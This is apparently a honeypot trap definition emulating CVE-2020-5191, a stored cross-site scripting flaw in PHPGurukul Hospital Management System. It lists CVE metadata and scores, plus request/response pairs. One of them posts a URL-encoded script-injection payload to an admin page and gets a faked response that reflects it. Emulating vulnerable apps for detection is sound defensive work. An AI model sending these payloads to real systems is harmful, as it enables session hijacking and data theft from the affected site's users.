id: CVE-2020-5191
info:
  name: PHPGurukul Hospital Management System - Cross-Site Scripting
  author: TenBird
  description: 'PHPGurukul Hospital Management System in PHP 4.0 contains multiple
    cross-site scripting vulnerabilities. An attacker can execute arbitrary script
    code in the browser of an unsuspecting user in the context of the affected site.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  remediation: 'Upgrade to the latest version to mitigate this vulnerability.

    '
  reference:
  - https://www.exploit-db.com/exploits/47841
  - https://phpgurukul.com/hospital-management-system-in-php/
  - https://nvd.nist.gov/vuln/detail/CVE-2020-5191
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-5191
    cwe-id: CWE-79
    epss-score: 0.00345
    epss-percentile: 0.68617
    cpe: cpe:2.3:a:phpgurukul:hospital_management_system:4.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: phpgurukul
    product: hospital_management_system
  tags: cve2020,cve,hms,cms,xss,authenticated,edb,phpgurukul
traps:
- request:
    method: POST
    path: /hospital/hms/admin/index.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'username={{username}}&password={{password}}&submit=&submit=

      '
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: <td class="hidden-xs"></td><script>alert(document.domain);</script><td>
- request:
    method: POST
    path: /hospital/hms/admin/doctor-specilization.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'doctorspecilization=%3C%2Ftd%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E%3Ctd%3E&submit=

      '
  response:
    status_code: 200
    headers: {}
    body: ''
